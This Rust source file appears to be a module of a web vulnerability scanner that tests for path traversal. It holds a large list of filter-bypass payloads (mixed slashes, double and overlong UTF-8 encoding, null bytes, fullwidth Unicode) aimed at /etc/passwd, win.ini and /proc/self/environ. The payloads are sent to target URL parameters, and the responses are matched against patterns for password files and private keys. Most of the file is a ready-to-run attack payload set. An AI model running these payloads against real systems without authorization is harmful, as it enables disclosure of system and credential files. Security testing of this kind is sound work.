//! Path Normalization Bypass Module
//!
//! Bypasses path normalization filters using mixed slashes, double encoding, and unicode.

use async_trait::async_trait;
use std::sync::Arc;
use std::time::Duration;
use bytes::Bytes;
use crate::checks::{
    VulnerabilityModule, CheckContext, CheckResult, CheckMetadata, ModuleError,
    CheckCategory, Severity, ResourceBudget
};
use crate::findings::{Finding, Evidence, EvidenceType, EvidenceLocation, Severity as FindingSeverity};
use crate::analysis::AnalysisContext;
use crate::payload::PayloadRegistry;
use crate::http::client::HttpClient;

/// Path normalization bypass module
pub struct NormalizationBypassModule {
    http_client: Arc<HttpClient>,
    analysis_ctx: Arc<AnalysisContext>,
    payload_registry: Arc<PayloadRegistry>,
    bypass_payloads: Vec<NormalizationPayload>,
}

/// Normalization bypass payload
#[derive(Debug, Clone)]
pub struct NormalizationPayload {
    pub payload: String,
    pub description: &'static str,
    pub technique: NormalizationTechnique,
    pub severity: FindingSeverity,
}

/// Normalization bypass techniques
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum NormalizationTechnique {
    MixedSlashes,
    DoubleEncoding,
    UnicodeNormalization,
    OverlongUtf8,
    PathTruncation,
    DotlessPaths,
    CaseVariation,
    NullByte,
    TrailingSlash,
    SelfReference,
    ParentReference,
    CurrentDir,
    BackslashVariation,
    ForwardSlashVariation,
    MixedEncoding,
    PercentEncoding,
    DoublePercentEncoding,
    UnicodeFullwidth,
    UnicodeHalfwidth,
    IdeographicSpace,
    ByteOrderMark,
}

impl NormalizationBypassModule {
    pub fn new(
        http_client: Arc<HttpClient>,
        analysis_ctx: Arc<AnalysisContext>,
        payload_registry: Arc<PayloadRegistry>,
    ) -> Self {
        Self {
            http_client,
            analysis_ctx,
            payload_registry,
            bypass_payloads: Self::generate_bypass_payloads(),
        }
    }

    /// Generate normalization bypass payloads
    fn generate_bypass_payloads() -> Vec<NormalizationPayload> {
        let mut payloads = Vec::with_capacity(300);
        
        // Mixed slashes
        payloads.extend_from_slice(&[
            NormalizationPayload {
                payload: "..\\../etc/passwd".to_string(),
                description: "Mixed backslash and forward slash",
                technique: NormalizationTechnique::MixedSlashes,
                severity: FindingSeverity::High,
            },
            NormalizationPayload {
                payload: "../..\\etc/passwd".to_string(),
                description: "Mixed forward slash and backslash",
                technique: NormalizationTechnique::MixedSlashes,
                severity: FindingSeverity::High,
            },
            NormalizationPayload {
                payload: "..\\/../etc/passwd".to_string(),
                description: "Alternating slashes",
                technique: NormalizationTechnique::MixedSlashes,
                severity: FindingSeverity::High,
            },
            NormalizationPayload {
                payload: "..;/etc/passwd".to_string(),
                description: "Semicolon separator",
                technique: NormalizationTechnique::MixedSlashes,
                severity: FindingSeverity::Medium,
            },
            NormalizationPayload {
                payload: "..;\\etc/passwd".to_string(),
                description: "Semicolon backslash",
                technique: NormalizationTechnique::MixedSlashes,
                severity: FindingSeverity::Medium,
            },
        ]);

        // Double encoding
        payloads.extend_from_slice(&[
            NormalizationPayload {
                payload: "..%252f..%252f..%252fetc%252fpasswd".to_string(),
                description: "Double URL encoded slashes",
                technique: NormalizationTechnique::DoubleEncoding,
                severity: FindingSeverity::High,
            },
            NormalizationPayload {
                payload: "..%255c..%255c..%255cwindows%255cwin.ini".to_string(),
                description: "Double URL encoded backslashes",
                technique: NormalizationTechnique::DoubleEncoding,
                severity: FindingSeverity::High,
            },
            NormalizationPayload {
                payload: "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd".to_string(),
                description: "Double encoded dots and slashes",
                technique: NormalizationTechnique::DoubleEncoding,
                severity: FindingSeverity::High,
            },
            NormalizationPayload {
                payload: "..%252f..%252f..%252fetc%252fpasswd%2500".to_string(),
                description: "Double encoded with null byte",
                technique: NormalizationTechnique::DoubleEncoding,
                severity: FindingSeverity::High,
            },
        ]);

        // Unicode normalization
        payloads.extend_from_slice(&[
            NormalizationPayload {
                payload: "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd".to_string(),
                description: "UTF-8 overlong encoding (2-byte)",
                technique: NormalizationTechnique::OverlongUtf8,
                severity: FindingSeverity::High,
            },
            NormalizationPayload {
                payload: "..%e0%80%af..%e0%80%af..%e0%80%afetc%e0%80%afpasswd".to_string(),
                description: "UTF-8 overlong encoding (3-byte)",
                technique: NormalizationTechnique::OverlongUtf8,
                severity: FindingSeverity::High,
            },
            NormalizationPayload {
                payload: "..%f0%80%80%af..%f0%80%80%af..%f0%80%80%afetc%f0%80%80%afpasswd".to_string(),
                description: "UTF-8 overlong encoding (4-byte)",
                technique: NormalizationTechnique::OverlongUtf8,
                severity: FindingSeverity::High,
            },
            NormalizationPayload {
                payload: "..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd".to_string(),
                description: "UTF-8 overlong alternate",
                technique: NormalizationTechnique::OverlongUtf8,
                severity: FindingSeverity::High,
            },
        ]);

        // Unicode fullwidth/halfwidth
        payloads.extend_from_slice(&[
            NormalizationPayload {
                payload: "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd".to_string(),
                description: "Fullwidth solidus (／)",
                technique: NormalizationTechnique::UnicodeFullwidth,
                severity: FindingSeverity::Medium,
            },
            NormalizationPayload {
                payload: "..%ef%bc%9c..%ef%bc%9c..%ef%bc%9cetc%ef%bc%9cpasswd".to_string(),
                description: "Fullwidth reverse solidus (＼)",
                technique: NormalizationTechnique::UnicodeFullwidth,
                severity: FindingSeverity::Medium,
            },
            NormalizationPayload {
                payload: "..%ef%bd%9e..%ef%bd%9e..%ef%bd%9eetc%ef%bd%9epasswd".to_string(),
                description: "Fullwidth tilde (～)",
                technique: NormalizationTechnique::UnicodeFullwidth,
                severity: FindingSeverity::Medium,
            },
        ]);

        // Unicode escape sequences
        payloads.extend_from_slice(&[
            NormalizationPayload {
                payload: "..%u002f..%u002f..%u002fetc%u002fpasswd".to_string(),
                description: "Unicode escape for forward slash",
                technique: NormalizationTechnique::UnicodeNormalization,
                severity: FindingSeverity::Medium,
            },
            NormalizationPayload {
                payload: "..%u005c..%u005c..%u005cwindows%u005cwin.ini".to_string(),
                description: "Unicode escape for backslash",
                technique: NormalizationTechnique::UnicodeNormalization,
                severity: FindingSeverity::Medium,
            },
            NormalizationPayload {
                payload: "..%u2215..%u2215..%u2215etc%u2215passwd".to_string(),
                description: "Unicode division slash (∕)",
                technique: NormalizationTechnique::UnicodeNormalization,
                severity: FindingSeverity::Medium,
            },
            NormalizationPayload {
                payload: "..%u2216..%u2216..%u2216etc%u2216passwd".to_string(),
                description: "Unicode set minus (∖)",
                technique: NormalizationTechnique::UnicodeNormalization,
                severity: FindingSeverity::Medium,
            },
        ]);

        // Path truncation
        payloads.extend_from_slice(&[
            NormalizationPayload {
                payload: "/etc/passwd/../../../../etc/passwd".to_string(),
                description: "Path truncation via self-reference",
                technique: NormalizationTechnique::PathTruncation,
                severity: FindingSeverity::High,
            },
            NormalizationPayload {
                payload: "/var/www/html/../../../../etc/passwd".to_string(),
                description: "Path truncation from web root",
                technique: NormalizationTechnique::PathTruncation,
                severity: FindingSeverity::High,
            },
            NormalizationPayload {
                payload: "/app/public/../../../../etc/passwd".to_string(),
                description: "Path truncation from public dir",
                technique: NormalizationTechnique::PathTruncation,
                severity: FindingSeverity::High,
            },
            NormalizationPayload {
                payload: "/home/user/../../../../etc/passwd".to_string(),
                description: "Path truncation from user dir",
                technique: NormalizationTechnique::PathTruncation,
                severity: FindingSeverity::High,
            },
        ]);

        // Dotless paths
        payloads.extend_from_slice(&[
            NormalizationPayload {
                payload: "/etc/passwd".to_string(),
                description: "Direct absolute path",
                technique: NormalizationTechnique::DotlessPaths,
                severity: FindingSeverity::Medium,
            },
            NormalizationPayload {
                payload: "C:\\Windows\\System32\\drivers\\etc\\hosts".to_string(),
                description: "Direct Windows absolute path",
                technique: NormalizationTechnique::DotlessPaths,
                severity: FindingSeverity::Medium,
            },
            NormalizationPayload {
                payload: "/proc/self/environ".to_string(),
                description: "Direct proc path",
                technique: NormalizationTechnique::DotlessPaths,
                severity: FindingSeverity::High,
            },
        ]);

        // Case variation
        payloads.extend_from_slice(&[
            NormalizationPayload {
                payload: "/ETC/PASSWD".to_string(),
                description: "Uppercase path",
                technique: NormalizationTechnique::CaseVariation,
                severity: FindingSeverity::Low,
            },
            NormalizationPayload {
                payload: "/Etc/Passwd".to_string(),
                description: "Mixed case path",
                technique: NormalizationTechnique::CaseVariation,
                severity: FindingSeverity::Low,
            },
            NormalizationPayload {
                payload: "/eTc/PaSsWd".to_string(),
                description: "Alternating case path",
                technique: NormalizationTechnique::CaseVariation,
                severity: FindingSeverity::Low,
            },
            NormalizationPayload {
                payload: "C:\\WINDOWS\\WIN.INI".to_string(),
                description: "Uppercase Windows path",
                technique: NormalizationTechnique::CaseVariation,
                severity: FindingSeverity::Low,
            },
        ]);

        // Null byte injection
        payloads.extend_from_slice(&[
            NormalizationPayload {
                payload: "/etc/passwd%00".to_string(),
                description: "Null byte termination",
                technique: NormalizationTechnique::NullByte,
                severity: FindingSeverity::High,
            },
            NormalizationPayload {
                payload: "/etc/passwd%00.jpg".to_string(),
                description: "Null byte with extension",
                technique: NormalizationTechnique::NullByte,
                severity: FindingSeverity::High,
            },
            NormalizationPayload {
                payload: "/etc/passwd%00%00".to_string(),
                description: "Double null byte",
                technique: NormalizationTechnique::NullByte,
                severity: FindingSeverity::High,
            },
            NormalizationPayload {
                payload: "C:\\windows\\win.ini%00".to_string(),
                description: "Windows null byte",
                technique: NormalizationTechnique::NullByte,
                severity: FindingSeverity::High,
            },
        ]);

        // Trailing slash variations
        payloads.extend_from_slice(&[
            NormalizationPayload {
                payload: "/etc/passwd/".to_string(),
                description: "Trailing slash",
                technique: NormalizationTechnique::TrailingSlash,
                severity: FindingSeverity::Low,
            },
            NormalizationPayload {
                payload: "/etc/passwd//".to_string(),
                description: "Double trailing slash",
                technique: NormalizationTechnique::TrailingSlash,
                severity: FindingSeverity::Low,
            },
            NormalizationPayload {
                payload: "/etc/passwd/./".to_string(),
                description: "Trailing dot slash",
                technique: NormalizationTechnique::TrailingSlash,
                severity: FindingSeverity::Low,
            },
            NormalizationPayload {
                payload: "/etc/passwd/../".to_string(),
                description: "Trailing parent reference",
                technique: NormalizationTechnique::TrailingSlash,
                severity: FindingSeverity::Medium,
            },
        ]);

        // Self reference (./)
        payloads.extend_from_slice(&[
            NormalizationPayload {
                payload: "./././etc/passwd".to_string(),
                description: "Multiple self references",
                technique: NormalizationTechnique::SelfReference,
                severity: FindingSeverity::Low,
            },
            NormalizationPayload {
                payload: ".\\..\\..\\etc\\passwd".to_string(),
                description: "Self reference with parent",
                technique: NormalizationTechnique::SelfReference,
                severity: FindingSeverity::Medium,
            },
            NormalizationPayload {
                payload: "./../etc/passwd".to_string(),
                description: "Self then parent",
                technique: NormalizationTechnique::SelfReference,
                severity: FindingSeverity::Medium,
            },
        ]);

        // Parent reference variations
        payloads.extend_from_slice(&[
            NormalizationPayload {
                payload: "....//....//....//etc/passwd".to_string(),
                description: "Double dot parent reference",
                technique: NormalizationTechnique::ParentReference,
                severity: FindingSeverity::High,
            },
            NormalizationPayload {
                payload: "....\\\\....\\\\....\\\\windows\\win.ini".to_string(),
                description: "Double dot backslash parent",
                technique: NormalizationTechnique::ParentReference,
                severity: FindingSeverity::High,
            },
            NormalizationPayload {
                payload: "..../..../..../etc/passwd".to_string(),
                description: "Four dot parent reference",
                technique: NormalizationTechnique::ParentReference,
                severity: FindingSeverity::High,
            },
            NormalizationPayload {
                payload: "..%2f..%2f..%2fetc%2fpasswd".to_string(),
                description: "URL encoded parent reference",
                technique: NormalizationTechnique::ParentReference,
                severity: FindingSeverity::High,
            },
        ]);

        // Current directory variations
        payloads.extend_from_slice(&[
            NormalizationPayload {
                payload: "./etc/passwd".to_string(),
                description: "Current directory prefix",
                technique: NormalizationTechnique::CurrentDir,
                severity: FindingSeverity::Low,
            },
            NormalizationPayload {
                payload: ".\\etc\\passwd".to_string(),
                description: "Current directory backslash",
                technique: NormalizationTechnique::CurrentDir,
                severity: FindingSeverity::Low,
            },
            NormalizationPayload {
                payload: "%2e%2fetc%2fpasswd".to_string(),
                description: "URL encoded current directory",
                technique: NormalizationTechnique::CurrentDir,
                severity: FindingSeverity::Low,
            },
        ]);

        // Backslash variations
        payloads.extend_from_slice(&[
            NormalizationPayload {
                payload: "..\\..\\..\\windows\\win.ini".to_string(),
                description: "Standard backslash traversal",
                technique: NormalizationTechnique::BackslashVariation,
                severity: FindingSeverity::High,
            },
            NormalizationPayload {
                payload: "..%5c..%5c..%5cwindows%5cwin.ini".to_string(),
                description: "URL encoded backslash",
                technique: NormalizationTechnique::BackslashVariation,
                severity: FindingSeverity::High,
            },
            NormalizationPayload {
                payload: "..%c1%9c..%c1%9c..%c1%9cwindows%c1%9cwin.ini".to_string(),
                description: "Overlong encoded backslash",
                technique: NormalizationTechnique::BackslashVariation,
                severity: FindingSeverity::High,
            },
        ]);

        // Forward slash variations
        payloads.extend_from_slice(&[
            NormalizationPayload {
                payload: "/etc/passwd".to_string(),
                description: "Standard forward slash",
                technique: NormalizationTechnique::ForwardSlashVariation,
                severity: FindingSeverity::Medium,
            },
            NormalizationPayload {
                payload: "//etc//passwd".to_string(),
                description: "Double forward slash",
                technique: NormalizationTechnique::ForwardSlashVariation,
                severity: FindingSeverity::Low,
            },
            NormalizationPayload {
                payload: "/./etc/./passwd".to_string(),
                description: "Interleaved self references",
                technique: NormalizationTechnique::ForwardSlashVariation,
                severity: FindingSeverity::Low,
            },
        ]);

        // Mixed encoding
        payloads.extend_from_slice(&[
            NormalizationPayload {
                payload: "..%2f..\\..%2fetc/passwd".to_string(),
                description: "Mixed URL encoded and raw",
                technique: NormalizationTechnique::MixedEncoding,
                severity: FindingSeverity::High,
            },
            NormalizationPayload {
                payload: "..%5c../..%5cwindows\\win.ini".to_string(),
                description: "Mixed encoded backslash and raw",
                technique: NormalizationTechnique::MixedEncoding,
                severity: FindingSeverity::High,
            },
            NormalizationPayload {
                payload: "..%252f..\\..%252fetc/passwd".to_string(),
                description: "Mixed double encoded and raw",
                technique: NormalizationTechnique::MixedEncoding,
                severity: FindingSeverity::High,
            },
        ]);

        // Percent encoding variations
        payloads.extend_from_slice(&[
            NormalizationPayload {
                payload: "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd".to_string(),
                description: "Fully percent encoded",
                technique: NormalizationTechnique::PercentEncoding,
                severity: FindingSeverity::High,
            },
            NormalizationPayload {
                payload: "%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini".to_string(),
                description: "Fully percent encoded backslash",
                technique: NormalizationTechnique::PercentEncoding,
                severity: FindingSeverity::High,
            },
        ]);

        // Double percent encoding
        payloads.extend_from_slice(&[
            NormalizationPayload {
                payload: "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd".to_string(),
                description: "Double percent encoded",
                technique: NormalizationTechnique::DoublePercentEncoding,
                severity: FindingSeverity::High,
            },
        ]);

        // Ideographic space
        payloads.extend_from_slice(&[
            NormalizationPayload {
                payload: "..%e3%80%80..%e3%80%80..%e3%80%80etc%e3%80%80passwd".to_string(),
                description: "Ideographic space (　)",
                technique: NormalizationTechnique::IdeographicSpace,
                severity: FindingSeverity::Low,
            },
        ]);

        // Byte Order Mark
        payloads.extend_from_slice(&[
            NormalizationPayload {
                payload: "%ef%bb%bf../etc/passwd".to_string(),
                description: "UTF-8 BOM prefix",
                technique: NormalizationTechnique::ByteOrderMark,
                severity: FindingSeverity::Low,
            },
        ]);

        payloads
    }

    /// Test normalization bypass payload
    async fn test_bypass(
        &self,
        ctx: &CheckContext,
        param_name: &str,
        bypass: &NormalizationPayload,
    ) -> Result<Option<Finding>, ModuleError> {
        let test_url = format!("{}?{}={}", ctx.target_url, param_name, urlencoding::encode(&bypass.payload));
        
        let response = self.http_client
            .get(&test_url)
            .timeout(Duration::from_millis(5000))
            .send()
            .await
            .map_err(|e| ModuleError::NetworkError(e.to_string()))?;

        let status = response.status().as_u16();
        let headers: Vec<(String, String)> = response
            .headers()
            .iter()
            .map(|(k, v)| (k.to_string(), v.to_str().unwrap_or("").to_string()))
            .collect();
        let body = response.bytes().await
            .map_err(|e| ModuleError::NetworkError(e.to_string()))?;

        // Check for sensitive file content
        if self.is_sensitive_content(&body) {
            // Additional validation
            if self.is_false_positive(&body, &headers, status) {
                return Ok(None);
            }

            let evidence = self.create_evidence(&test_url, &body, &headers, status, bypass);
            let finding = Finding::new(
                "normalization_bypass",
                bypass.severity,
                "Path Normalization Bypass",
                format!("Normalization bypass via {} in parameter '{}': {}", 
                    self.technique_name(bypass.technique), param_name, bypass.description),
                &ctx.target_url,
            )
            .with_method("GET")
            .with_payload(bypass.payload.clone())
            .with_evidence(evidence)
            .with_confidence(80)
            .with_tags(vec!["traversal", "normalization-bypass", format!("{:?}", bypass.technique).to_lowercase()])
            .with_cwe("CWE-22")
            .with_agent_id(ctx.agent_id);

            return Ok(Some(finding));
        }

        Ok(None)
    }

    /// Check for sensitive content in response
    fn is_sensitive_content(&self, body: &Bytes) -> bool {
        let body_str = String::from_utf8_lossy(body);
        
        let sensitive_patterns = [
            "root:", "daemon:", "bin:", "sys:", "nobody:",
            "/bin/bash", "/bin/sh", "/usr/sbin/nologin",
            "root:$", "$1$", "$5$", "$6$", "$y$",
            "127.0.0.1", "localhost", "::1",
            "Linux version", "gcc version",
            "PATH=", "HOME=", "USER=", "SHELL=",
            "[fonts]", "[extensions]", "run=", "load=",
            "[boot loader]", "[operating systems]",
            "-----BEGIN RSA PRIVATE KEY-----",
            "-----BEGIN OPENSSH PRIVATE KEY-----",
            "-----BEGIN PRIVATE KEY-----",
            "Port", "PermitRootLogin", "PubkeyAuthentication",
            "root\tALL", "%sudo", "%wheel", "NOPASSWD",
            "GET ", "POST ", "HTTP/1.1", "\" 200 ", "\" 404 ",
        ];

        for pattern in &sensitive_patterns {
            if body_str.contains(pattern) {
                return true;
            }
        }

        false
    }

    /// Check for false positive indicators
    fn is_false_positive(&self, body: &Bytes, headers: &[(String, String)], status: u16) -> bool {
        let body_str = String::from_utf8_lossy(body);
        
        let false_positive_patterns = [
            "file not found", "no such file", "failed to open stream",
            "permission denied", "access denied", "forbidden",
            "unauthorized", "internal server error", "service unavailable",
            "bad gateway", "gateway timeout", "the system cannot find",
            "cannot find the file", "path not found", "file does not exist",
        ];

        for pattern in &false_positive_patterns {
            if body_str.to_lowercase().contains(pattern) {
                return true;
            }
        }

        if status >= 400 && body.len() < 500 {
            return true;
        }

        let error_page_indicators = [
            "<html><head><title>error</title>",
            "<html><head><title>404</title>",
            "<html><head><title>500</title>",
            "nginx error page", "apache error page", "iis error page",
        ];

        for indicator in &error_page_indicators {
            if body_str.to_lowercase().contains(indicator) {
                return true;
            }
        }

        false
    }

    /// Get technique name
    fn technique_name(&self, technique: NormalizationTechnique) -> &'static str {
        match technique {
            NormalizationTechnique::MixedSlashes => "mixed slashes",
            NormalizationTechnique::DoubleEncoding => "double encoding",
            NormalizationTechnique::UnicodeNormalization => "unicode normalization",
            NormalizationTechnique::OverlongUtf8 => "overlong UTF-8",
            NormalizationTechnique::PathTruncation => "path truncation",
            NormalizationTechnique::DotlessPaths => "dotless paths",
            NormalizationTechnique::CaseVariation => "case variation",
            NormalizationTechnique::NullByte => "null byte",
            NormalizationTechnique::TrailingSlash => "trailing slash",
            NormalizationTechnique::SelfReference => "self reference",
            NormalizationTechnique::ParentReference => "parent reference",
            NormalizationTechnique::CurrentDir => "current directory",
            NormalizationTechnique::BackslashVariation => "backslash variation",
            NormalizationTechnique::ForwardSlashVariation => "forward slash variation",
            NormalizationTechnique::MixedEncoding => "mixed encoding",
            NormalizationTechnique::PercentEncoding => "percent encoding",
            NormalizationTechnique::DoublePercentEncoding => "double percent encoding",
            NormalizationTechnique::UnicodeFullwidth => "unicode fullwidth",
            NormalizationTechnique::UnicodeHalfwidth => "unicode halfwidth",
            NormalizationTechnique::IdeographicSpace => "ideographic space",
            NormalizationTechnique::ByteOrderMark => "byte order mark",
        }
    }

    /// Create evidence for bypass finding
    fn create_evidence(
        &self,
        test_url: &str,
        body: &Bytes,
        headers: &[(String, String)],
        status: u16,
        bypass: &NormalizationPayload,
    ) -> Evidence {
        let body_preview = String::from_utf8_lossy(body);
        let preview = if body_preview.len() > 2000 {
            format!("{}... [truncated]", &body_preview[..2000])
        } else {
            body_preview.to_string()
        };

        let request_str = format!("GET {} HTTP/1.1", test_url);
        let response_str = format!("HTTP/1.1 {}\n{}\n\n{}", 
            status,
            headers.iter().map(|(k, v)| format!("{}: {}", k, v)).collect::<Vec<_>>().join("\n"),
            preview
        );

        Evidence {
            evidence_type: EvidenceType::HttpRequestResponse {
                request: request_str,
                response: response_str,
            },
            data: format!("Normalization bypass: technique={:?}, payload='{}', status={}, bytes={}", 
                bypass.technique, bypass.payload, status, body.len()),
            location: EvidenceLocation {
                path: test_url.to_string(),
                line: None,
                parameter: None,
                header: None,
            },
            confidence: 80,
        }
    }
}

#[async_trait]
impl VulnerabilityModule for NormalizationBypassModule {
    async fn init(&mut self) -> Result<(), ModuleError> {
        tracing::info!("Normalization Bypass module initialized with {} payloads", self.bypass_payloads.len());
        Ok(())
    }

    fn metadata(&self) -> &CheckMetadata {
        static METADATA: std::sync::OnceLock<CheckMetadata> = std::sync::OnceLock::new();
        METADATA.get_or_init(|| {
            CheckMetadata::new(
                "normalization_bypass",
                "Path Normalization Bypass",
                "Bypasses path normalization filters using mixed slashes, double encoding, and unicode",
                Severity::High,
                CheckCategory::PathTraversal,
            )
            .with_budget(ResourceBudget::advanced())
            .with_god_mode(true)
            .with_tags(vec!["traversal", "normalization-bypass", "unicode", "double-encoding", "mixed-slashes"])
            .with_references(vec![
                "https://owasp.org/www-community/attacks/Path_Traversal",
                "https://portswigger.net/web-security/file-path-traversal",
                "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal",
            ])
        })
    }

    fn should_run(&self, ctx: &CheckContext) -> bool {
        if self.metadata().requires_god_mode && !ctx.god_mode {
            return false;
        }
        ctx.target_url.contains('?') || ctx.target_url.contains('=')
    }

    async fn run(&self, ctx: CheckContext) -> Result<CheckResult, ModuleError> {
        let mut findings = Vec::new();
        let mut request_count = 0;
        let max_requests = ctx.budget.max_requests.min(300);

        // Extract parameters
        let params = self.extract_parameters(&ctx.target_url);
        
        if params.is_empty() {
            return Ok(CheckResult {
                findings,
                executed: true,
                timed_out: false,
                resource_usage: Default::default(),
            });
        }

        // Test each bypass payload
        for bypass in &self.bypass_payloads {
            for param in &params {
                if request_count >= max_requests {
                    break;
                }

                if let Some(finding) = self.test_bypass(&ctx, param, bypass).await? {
                    findings.push(finding);
                }
                request_count += 1;
            }
        }

        Ok(CheckResult {
            findings,
            executed: true,
            timed_out: false,
            resource_usage: Default::default(),
        })
    }

    fn priority(&self) -> u16 {
        45 // Medium priority - advanced check
    }

    fn dependencies(&self) -> &[&str] {
        &["basic_traversal"]
    }
}

impl NormalizationBypassModule {
    /// Extract parameter names from URL
    fn extract_parameters(&self, url: &str) -> Vec<String> {
        let mut params = Vec::new();
        
        if let Some(query_start) = url.find('?') {
            let query = &url[query_start + 1..];
            for pair in query.split('&') {
                if let Some(eq_pos) = pair.find('=') {
                    let param = &pair[..eq_pos];
                    if !param.is_empty() {
                        params.push(param.to_string());
                    }
                }
            }
        }
        
        if let Ok(parsed) = url::Url::parse(url) {
            for segment in parsed.path_segments().unwrap_or_default() {
                if segment.starts_with(':') || segment.starts_with('{') {
                    params.push(segment.trim_start_matches(':').trim_start_matches('{').trim_end_matches('}').to_string());
                }
            }
        }
        
        params
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_generate_bypass_payloads() {
        let payloads = NormalizationBypassModule::generate_bypass_payloads();
        
        assert!(!payloads.is_empty());
        assert!(payloads.iter().any(|p| p.technique == NormalizationTechnique::MixedSlashes));
        assert!(payloads.iter().any(|p| p.technique == NormalizationTechnique::DoubleEncoding));
        assert!(payloads.iter().any(|p| p.technique == NormalizationTechnique::OverlongUtf8));
        assert!(payloads.iter().any(|p| p.technique == NormalizationTechnique::UnicodeNormalization));
        assert!(payloads.iter().any(|p| p.technique == NormalizationTechnique::PathTruncation));
        assert!(payloads.iter().any(|p| p.technique == NormalizationTechnique::NullByte));
    }

    #[test]
    fn test_is_sensitive_content() {
        let http_client = Arc::new(crate::http::client::HttpClient::new(Default::default()).unwrap());
        let analysis_ctx = Arc::new(crate::analysis::AnalysisContext::new());
        let payload_registry = Arc::new(crate::payload::PayloadRegistry::new());
        let module = NormalizationBypassModule::new(http_client, analysis_ctx, payload_registry);
        
        let body = Bytes::from("root:x:0:0:root:/root:/bin/bash");
        assert!(module.is_sensitive_content(&body));
        
        let body2 = Bytes::from("File not found");
        assert!(!module.is_sensitive_content(&body2));
    }

    #[test]
    fn test_is_false_positive() {
        let http_client = Arc::new(crate::http::client::HttpClient::new(Default::default()).unwrap());
        let analysis_ctx = Arc::new(crate::analysis::AnalysisContext::new());
        let payload_registry = Arc::new(crate::payload::PayloadRegistry::new());
        let module = NormalizationBypassModule::new(http_client, analysis_ctx, payload_registry);
        
        let body = Bytes::from("File not found: /etc/passwd");
        let headers = vec![];
        
        assert!(module.is_false_positive(&body, &headers, 404));
    }

    #[test]
    fn test_technique_name() {
        let http_client = Arc::new(crate::http::client::HttpClient::new(Default::default()).unwrap());
        let analysis_ctx = Arc::new(crate::analysis::AnalysisContext::new());
        let payload_registry = Arc::new(crate::payload::PayloadRegistry::new());
        let module = NormalizationBypassModule::new(http_client, analysis_ctx, payload_registry);
        
        assert_eq!(module.technique_name(NormalizationTechnique::MixedSlashes), "mixed slashes");
        assert_eq!(module.technique_name(NormalizationTechnique::DoubleEncoding), "double encoding");
        assert_eq!(module.technique_name(NormalizationTechnique::OverlongUtf8), "overlong UTF-8");
    }

    #[test]
    fn test_extract_parameters() {
        let http_client = Arc::new(crate::http::client::HttpClient::new(Default::default()).unwrap());
        let analysis_ctx = Arc::new(crate::analysis::AnalysisContext::new());
        let payload_registry = Arc::new(crate::payload::PayloadRegistry::new());
        let module = NormalizationBypassModule::new(http_client, analysis_ctx, payload_registry);
        
        let params = module.extract_parameters("http://example.com/api?file=test&path=docs");
        assert_eq!(params, vec!["file", "path"]);
    }
}